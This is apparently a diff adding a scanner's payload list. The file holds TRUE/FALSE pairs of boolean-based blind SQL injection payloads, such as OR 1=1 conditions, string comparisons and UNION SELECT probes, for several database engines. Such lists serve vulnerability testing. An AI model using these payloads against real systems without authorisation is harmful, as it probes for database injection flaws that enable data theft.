@@ -1,0 +1,40 @@
+# Boolean-Based Blind SQLi Payloads
+# Format: TRUE_payload|FALSE_payload
+# These payloads test if SQL injection exists by comparing TRUE vs FALSE responses
+
+# Basic boolean conditions (MySQL, PostgreSQL, MSSQL, Oracle)
+1 OR 1=1|1 AND 1=2
+1 OR 17-7=10|1 AND 17-7=11
+1' OR '1'='1|1' AND '1'='2
+1" OR "1"="1|1" AND "1"="2
+
+# Arithmetic-based (Acunetix-style)
+1 OR 2+2=4|1 AND 2+2=5
+1' OR 7*7=49|1' AND 7*7=50
+-1 OR 17-7=10|-1 AND 17-7=11
+
+# Substring/string comparison
+1' OR 'a'='a|1' AND 'a'='b
+1" OR "x"="x|1" AND "x"="y
+1' OR SUBSTR('test',1,1)='t|1' AND SUBSTR('test',1,1)='x
+
+# Numeric ID manipulation
+1 OR 1=1--|-1 OR 1=2--
+999 OR 1=1|999 AND 1=2
+
+# OR/AND logic variations
+1) OR (1=1|1) AND (1=2
+' OR 1=1 --| AND 1=2 --
+" OR 1=1 #|" AND 1=2 #
+
+# Mathematical comparisons
+1 OR 5>4|1 AND 5<4
+1' OR 10>9|1' AND 10<9
+
+# Database-specific
+1' OR @@version IS NOT NULL|1' AND @@version IS NULL
+1' OR USER() LIKE '%|1' AND USER() LIKE 'impossible
+
+# UNION-based boolean
+1' UNION SELECT 1|1' UNION SELECT NULL WHERE 1=2
+1 UNION ALL SELECT 1|1 UNION ALL SELECT NULL WHERE 1=2
